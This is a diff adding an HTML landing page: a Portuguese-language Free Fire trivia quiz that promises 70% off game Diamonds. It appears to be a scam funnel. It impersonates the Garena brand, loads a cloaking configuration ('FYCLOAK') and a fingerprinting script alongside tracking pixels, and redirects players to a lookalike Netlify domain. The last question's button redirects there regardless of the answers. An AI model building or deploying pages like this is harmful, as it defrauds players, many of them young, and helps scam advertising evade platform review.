@@ -1,0 +1,735 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <script type="text/javascript" async="" src="js/events.js"></script><script async="" src="js/fbevents.js"></script><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1820887258562991');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1820887258562991&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    <script>
+      window.pixelId = "696bb5b99796747308a1dfd6";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#FF5722">
+    <title>Quiz Free Fire - Até 70% OFF em Diamantes</title>
+    <meta name="description" content="Participe do Quiz de Aniversário Free Fire e receba até 70% de desconto em pacotes de Diamantes! Teste seus conhecimentos sobre o jogo.">
+    
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: #ffffff;
+        min-height: 100vh;
+        padding: 20px;
+        color: #333;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        background: white;
+        border-radius: 16px;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        overflow: hidden;
+        border: 1px solid #f0f0f0;
+      }
+
+      .header {
+        background: #ffffff;
+        padding: 25px 20px;
+        text-align: center;
+        border-bottom: 1px solid #f0f0f0;
+      }
+
+      .header img {
+        max-width: 180px;
+        height: auto;
+        display: block;
+        margin: 0 auto;
+      }
+
+      .quiz-content {
+        padding: 30px 25px;
+      }
+
+      .question-container {
+        display: none;
+      }
+
+      .question-container.active {
+        display: block;
+      }
+
+      .question-number {
+        text-align: center;
+        color: #666;
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 20px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      .question-image {
+        width: 100%;
+        max-width: 100%;
+        height: auto;
+        border-radius: 12px;
+        margin-bottom: 25px;
+        box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        border: 1px solid #f0f0f0;
+      }
+
+      .question-text {
+        font-size: 18px;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 25px;
+        color: #333;
+        line-height: 1.5;
+      }
+
+      .options {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        margin-bottom: 30px;
+      }
+
+      .option {
+        padding: 16px 20px;
+        background: #fafafa;
+        border: 1.5px solid #e0e0e0;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        font-size: 15px;
+        text-align: center;
+        color: #333;
+        font-weight: 500;
+      }
+
+      .option:hover {
+        background: #fff5f2;
+        border-color: #FF5722;
+        transform: translateY(-2px);
+        box-shadow: 0 2px 8px rgba(255,87,34,0.15);
+      }
+
+      .option.selected {
+        background: #FF5722;
+        color: white;
+        border-color: #FF5722;
+      }
+
+      .option.correct {
+        background: #4CAF50;
+        border-color: #4CAF50;
+        color: white;
+      }
+
+      .option.wrong {
+        background: #f44336;
+        border-color: #f44336;
+        color: white;
+      }
+
+      .btn-next {
+        width: 100%;
+        padding: 14px;
+        background: #FF5722;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+
+      .btn-next:hover {
+        background: #FF7043;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 12px rgba(255,87,34,0.25);
+      }
+
+      .btn-next:disabled {
+        background: #e0e0e0;
+        color: #9e9e9e;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .progress-bar {
+        height: 6px;
+        background: #f0f0f0;
+        border-radius: 10px;
+        margin-bottom: 25px;
+        overflow: hidden;
+      }
+
+      .progress-fill {
+        height: 100%;
+        background: #FF5722;
+        transition: width 0.3s ease;
+        width: 0%;
+        border-radius: 10px;
+      }
+
+      /* Popup de erro */
+      .popup-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.7);
+        z-index: 1000;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .popup-overlay.show {
+        display: flex;
+      }
+
+      .popup {
+        background: white;
+        padding: 35px 30px;
+        border-radius: 16px;
+        max-width: 400px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 8px 32px rgba(0,0,0,0.12);
+        animation: popupSlide 0.3s ease;
+      }
+
+      @keyframes popupSlide {
+        from {
+          transform: scale(0.8);
+          opacity: 0;
+        }
+        to {
+          transform: scale(1);
+          opacity: 1;
+        }
+      }
+
+      .popup h2 {
+        color: #FF5722;
+        margin-bottom: 16px;
+        font-size: 22px;
+        font-weight: 600;
+      }
+
+      .popup p {
+        color: #666;
+        margin-bottom: 24px;
+        line-height: 1.6;
+        font-size: 15px;
+      }
+
+      .popup-btn {
+        padding: 12px 28px;
+        background: #FF5722;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        font-size: 15px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+
+      .popup-btn:hover {
+        background: #FF7043;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 12px rgba(255,87,34,0.25);
+      }
+
+      /* Animações simples de confete */
+      .confetti {
+        position: fixed;
+        width: 8px;
+        height: 8px;
+        background: #FF5722;
+        animation: confettiFall 1.5s linear;
+        z-index: 9999;
+        pointer-events: none;
+      }
+
+      @keyframes confettiFall {
+        0% {
+          transform: translateY(-10px);
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(100px);
+          opacity: 0;
+        }
+      }
+
+      /* Feedback de acerto simplificado */
+      .correct-feedback {
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #4CAF50;
+        color: white;
+        padding: 12px 24px;
+        border-radius: 8px;
+        font-size: 14px;
+        font-weight: 600;
+        z-index: 10000;
+        box-shadow: 0 4px 12px rgba(76,175,80,0.3);
+        animation: slideDown 0.3s ease;
+        display: none;
+      }
+
+      .correct-feedback.show {
+        display: block;
+      }
+
+      @keyframes slideDown {
+        from {
+          transform: translateX(-50%) translateY(-20px);
+          opacity: 0;
+        }
+        to {
+          transform: translateX(-50%) translateY(0);
+          opacity: 1;
+        }
+      }
+
+      @media (max-width: 600px) {
+        .container {
+          border-radius: 0;
+          margin: -20px;
+        }
+
+        .quiz-content {
+          padding: 20px 15px;
+        }
+
+        .question-text {
+          font-size: 18px;
+        }
+
+        .option {
+          padding: 12px 15px;
+          font-size: 14px;
+        }
+
+        .correct-feedback {
+          font-size: 24px;
+          padding: 20px 30px;
+        }
+      }
+    </style>
+<script>
+    window.FYCLOAK_CAMPAIGN_ID = 3438;  // ID da sua campanha
+    window.FYCLOAK_USER_ID = 543;      // Seu user ID
+</script>
+<script src="js/advanced-fingerprint.js"></script>    
+<script>
+  window.tikTokPixelId = "696d462b74be2b8a86893d91";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel-tiktok.js"></script>
+<script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D5K8AU3C77U2LQ3IRTF0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="header">
+        <img src="images/freefire-logo-khkzMQoZ.png" alt="Free Fire Logo" id="logo" onerror="this.style.display='none'; console.error('Logo não encontrada. Verifique o caminho: ../quizimages/freefire-logo-khkzMQoZ.png');" style="display: none;">
+      </div>
+
+      <div class="quiz-content">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill" style="width: 10%;"></div>
+        </div>
+
+        <!-- Pergunta 1 -->
+        <div class="question-container active" data-question="1">
+          <div class="question-number">Pergunta 1 de 10</div>
+          <img src="images/q1-xs2wBzmH.jpg" alt="Pergunta 1" class="question-image">
+          <div class="question-text">Qual é o nome do modo de jogo principal do Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Team Deathmatch</div>
+            <div class="option" data-answer="B">Clash Squad</div>
+            <div class="option" data-answer="C">Battle Royale</div>
+            <div class="option" data-answer="D">Modo Ranqueado</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 2 -->
+        <div class="question-container" data-question="2">
+          <div class="question-number">Pergunta 2 de 10</div>
+          <img src="images/q2-CM_6vL28.jpg" alt="Pergunta 2" class="question-image">
+          <div class="question-text">Qual é a habilidade especial do personagem DJ Alok?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Cura em área</div>
+            <div class="option" data-answer="B">Velocidade aumentada</div>
+            <div class="option" data-answer="C">Dano extra</div>
+            <div class="option" data-answer="D">Escudo de proteção</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 3 -->
+        <div class="question-container" data-question="3">
+          <div class="question-number">Pergunta 3 de 10</div>
+          <img src="images/q3-Cb4k91U-.jpg" alt="Pergunta 3" class="question-image">
+          <div class="question-text">Qual é o mapa clássico do Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Kalahari</div>
+            <div class="option" data-answer="B">Alpine</div>
+            <div class="option" data-answer="C">Purgatório</div>
+            <div class="option" data-answer="D">Bermuda</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 4 -->
+        <div class="question-container" data-question="4">
+          <div class="question-number">Pergunta 4 de 10</div>
+          <img src="images/q4-B9XKu97q.jpg" alt="Pergunta 4" class="question-image">
+          <div class="question-text">Qual é a arma de sniper mais poderosa do Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Kar98k</div>
+            <div class="option" data-answer="B">AWM</div>
+            <div class="option" data-answer="C">M82B</div>
+            <div class="option" data-answer="D">SVD</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 5 -->
+        <div class="question-container" data-question="5">
+          <div class="question-number">Pergunta 5 de 10</div>
+          <img src="images/q5-Ds7-7wwZ.jpg" alt="Pergunta 5" class="question-image">
+          <div class="question-text">Quantos jogadores podem estar em uma squad no modo clássico?</div>
+          <div class="options">
+            <div class="option" data-answer="A">2</div>
+            <div class="option" data-answer="B">5</div>
+            <div class="option" data-answer="C">3</div>
+            <div class="option" data-answer="D">4</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 6 -->
+        <div class="question-container" data-question="6">
+          <div class="question-number">Pergunta 6 de 10</div>
+          <img src="images/q6-BCg-J60G.jpg" alt="Pergunta 6" class="question-image">
+          <div class="question-text">Qual é a função dos pets no Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Atacar inimigos</div>
+            <div class="option" data-answer="B">Carregar objetos</div>
+            <div class="option" data-answer="C">Apenas decoração</div>
+            <div class="option" data-answer="D">Fornecer habilidades especiais</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 7 -->
+        <div class="question-container" data-question="7">
+          <div class="question-number">Pergunta 7 de 10</div>
+          <img src="images/q7-DKFne6Xe.jpg" alt="Pergunta 7" class="question-image">
+          <div class="question-text">Qual é o rank mais alto no modo ranqueado do Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Heroico</div>
+            <div class="option" data-answer="B">Diamante</div>
+            <div class="option" data-answer="C">Mestre</div>
+            <div class="option" data-answer="D">Grandmestre</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 8 -->
+        <div class="question-container" data-question="8">
+          <div class="question-number">Pergunta 8 de 10</div>
+          <img src="images/q8-D7j6gjaZ.jpg" alt="Pergunta 8" class="question-image">
+          <div class="question-text">Qual veículo é conhecido como o mais resistente no Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Monster Truck</div>
+            <div class="option" data-answer="B">Moto</div>
+            <div class="option" data-answer="C">Tuk Tuk</div>
+            <div class="option" data-answer="D">Carro</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 9 -->
+        <div class="question-container" data-question="9">
+          <div class="question-number">Pergunta 9 de 10</div>
+          <img src="images/q9-D5xcCcXH.jpg" alt="Pergunta 9" class="question-image">
+          <div class="question-text">O que são as skins no Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Missões</div>
+            <div class="option" data-answer="B">Moeda do jogo</div>
+            <div class="option" data-answer="C">Personalizações visuais</div>
+            <div class="option" data-answer="D">Armas especiais</div>
+          </div>
+          <button class="btn-next" disabled="">Próxima Pergunta</button>
+        </div>
+
+        <!-- Pergunta 10 -->
+        <div class="question-container" data-question="10">
+          <div class="question-number">Pergunta 10 de 10</div>
+          <img src="images/q10-CIi6E73x.jpg" alt="Pergunta 10" class="question-image">
+          <div class="question-text">O que você encontra em um airdrop no Free Fire?</div>
+          <div class="options">
+            <div class="option" data-answer="A">Comida</div>
+            <div class="option" data-answer="B">Pets</div>
+            <div class="option" data-answer="C">Veículos</div>
+            <div class="option" data-answer="D">Itens raros e armas poderosas</div>
+         </div>
+<button 
+  class="btn-next"
+  onclick="window.location.href='https://freefiregarenafff.netlify.app/';">
+  Finalizar Quiz
+</button>
+</div>
+
+      </div>
+    </div>
+
+    <!-- Feedback de acerto -->
+    <div class="correct-feedback" id="correctFeedback">
+      ✓ Acertou!
+    </div>
+
+    <!-- Popup de tentar novamente -->
+    <div class="popup-overlay" id="popupOverlay">
+      <div class="popup">
+        <h2>😔 Que pena!</h2>
+        <p>Você não atingiu 60% de acertos. Tente novamente para ganhar seu desconto de 70% OFF!</p>
+        <button class="popup-btn" onclick="location.reload()">Tentar Novamente</button>
+      </div>
+    </div>
+
+    <script>
+      // Respostas corretas
+      const correctAnswers = {
+        1: 'C', // Battle Royale
+        2: 'A', // Cura em área
+        3: 'D', // Bermuda
+        4: 'B', // AWM
+        5: 'D', // 4
+        6: 'D', // Fornecer habilidades especiais
+        7: 'A', // Heroico
+        8: 'A', // Monster Truck
+        9: 'C', // Personalizações visuais
+        10: 'D' // Itens raros e armas poderosas
+      };
+
+      let currentQuestion = 1;
+      const totalQuestions = 10;
+      let answers = {};
+      let score = 0;
+
+      // Inicializar quiz
+      function initQuiz() {
+        updateProgress();
+        setupQuestionListeners();
+      }
+
+      // Atualizar barra de progresso
+      function updateProgress() {
+        const progress = (currentQuestion / totalQuestions) * 100;
+        document.getElementById('progressFill').style.width = progress + '%';
+      }
+
+      // Criar confetes simples
+      function createConfetti() {
+        const colors = ['#FF5722', '#4CAF50'];
+        const confettiCount = 15;
+        
+        for (let i = 0; i < confettiCount; i++) {
+          setTimeout(() => {
+            const confetti = document.createElement('div');
+            confetti.className = 'confetti';
+            confetti.style.left = Math.random() * 100 + '%';
+            confetti.style.top = '20px';
+            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+            document.body.appendChild(confetti);
+            
+            setTimeout(() => {
+              confetti.remove();
+            }, 1500);
+          }, i * 30);
+        }
+      }
+
+      // Mostrar feedback de acerto
+      function showCorrectFeedback() {
+        const feedback = document.getElementById('correctFeedback');
+        feedback.classList.add('show');
+        createConfetti();
+        
+        setTimeout(() => {
+          feedback.classList.remove('show');
+        }, 1500);
+      }
+
+      // Configurar listeners das perguntas
+      function setupQuestionListeners() {
+        const options = document.querySelectorAll('.question-container.active .option');
+        const nextBtn = document.querySelector('.question-container.active .btn-next');
+        const questionNum = parseInt(document.querySelector('.question-container.active').dataset.question);
+        let answered = false;
+
+        options.forEach(option => {
+          option.addEventListener('click', function() {
+            if (answered) return;
+            
+            answered = true;
+            const selectedAnswer = this.dataset.answer;
+            const correctAnswer = correctAnswers[questionNum];
+            
+            // Desabilitar todas as opções
+            options.forEach(opt => {
+              opt.style.pointerEvents = 'none';
+            });
+
+            // Marcar resposta correta
+            options.forEach(opt => {
+              if (opt.dataset.answer === correctAnswer) {
+                opt.classList.add('correct');
+              } else if (opt.dataset.answer === selectedAnswer && selectedAnswer !== correctAnswer) {
+                opt.classList.add('wrong');
+              }
+            });
+
+            // Salvar resposta
+            answers[questionNum] = selectedAnswer;
+
+            // Se acertou, mostrar animação
+            if (selectedAnswer === correctAnswer) {
+              showCorrectFeedback();
+            }
+
+            // Habilitar botão próximo após um delay
+            setTimeout(() => {
+              nextBtn.disabled = false;
+            }, 1000);
+          });
+        });
+
+        nextBtn.addEventListener('click', function() {
+          if (!this.disabled && answered) {
+            goToNextQuestion();
+          }
+        });
+      }
+
+      // Ir para próxima pergunta
+      function goToNextQuestion() {
+        const currentContainer = document.querySelector('.question-container.active');
+        const questionNum = parseInt(currentContainer.dataset.question);
+
+        if (questionNum < totalQuestions) {
+          // Esconder pergunta atual
+          currentContainer.classList.remove('active');
+          
+          // Mostrar próxima pergunta
+          const nextContainer = document.querySelector(`[data-question="${questionNum + 1}"]`);
+          nextContainer.classList.add('active');
+          
+          currentQuestion = questionNum + 1;
+          updateProgress();
+          setupQuestionListeners();
+        } else {
+          // Finalizar quiz
+          finishQuiz();
+        }
+      }
+
+      // Função para preservar parâmetros UTM na URL
+      function preserveUtmParams(targetUrl) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const params = {};
+        // Capturar todos os parâmetros da URL atual
+        for (const [key, value] of urlParams.entries()) {
+          params[key] = value;
+        }
+        const queryString = new URLSearchParams(params).toString();
+        return queryString ? `${targetUrl}?${queryString}` : targetUrl;
+      }
+
+      // Finalizar quiz e calcular pontuação
+      function finishQuiz() {
+        score = 0;
+        for (let i = 1; i <= totalQuestions; i++) {
+          if (answers[i] === correctAnswers[i]) {
+            score++;
+          }
+        }
+
+        const percentage = (score / totalQuestions) * 100;
+
+        // Se acertou 60% ou mais, redirecionar para página de resultado
+        if (percentage >= 60) {
+          // Salvar pontuação no localStorage para a página de resultado
+          localStorage.setItem('quizScore', score);
+          localStorage.setItem('quizTotal', totalQuestions);
+          window.location.href = preserveUtmParams('https://freefiregarenafff.netlify.app/');
+        } else {
+          // Mostrar popup de tentar novamente
+          document.getElementById('popupOverlay').classList.add('show');
+        }
+      }
+
+      // Inicializar quando a página carregar
+      document.addEventListener('DOMContentLoaded', initQuiz);
+    </script>
+
+  
+
+</body></html>
